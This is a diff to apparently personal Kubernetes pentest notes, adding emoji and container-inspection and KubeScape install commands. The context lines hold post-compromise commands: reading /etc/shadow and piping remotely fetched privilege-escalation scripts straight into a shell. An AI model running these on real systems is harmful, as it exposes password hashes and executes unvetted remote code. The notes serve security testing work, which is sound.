@@ -46,20 +46,28 @@ Exec into the container
     kubectl exec --stdin --tty nginx1 -n open -- /bin/sh 
     kubectl exec --stdin --tty nginx1 -n open -- /bin/bash
 
-And things to do inside the container
+And things to do inside the container 👾
 
     id && uname -a && pwd && env
     cat /etc/shadow
 
-Checks Unix system for simple privilege escalations - Cron
+Checks Unix system for simple privilege escalations - Cron 👾
 
     curl https://raw.githubusercontent.com/hexobandit/knowledge-db/refs/heads/main/check_cron_access.sh | sh
 
-Checks Unix system for simple privilege escalations - Pentest Monkey 
+Checks Unix system for simple privilege escalations - Pentest Monkey 👾
 
     curl https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/refs/heads/1_x/unix-privesc-check > unix-privesc-check.sh
     chmod +x unix-privesc-check.sh
     ./unix-privesc-check.sh
+
+Inspect Container 👾
+
+    cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
+
+Installing KubeScape 👾
+
+    curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash
 
 ## More Than One Cluster?
 See all existting clusters
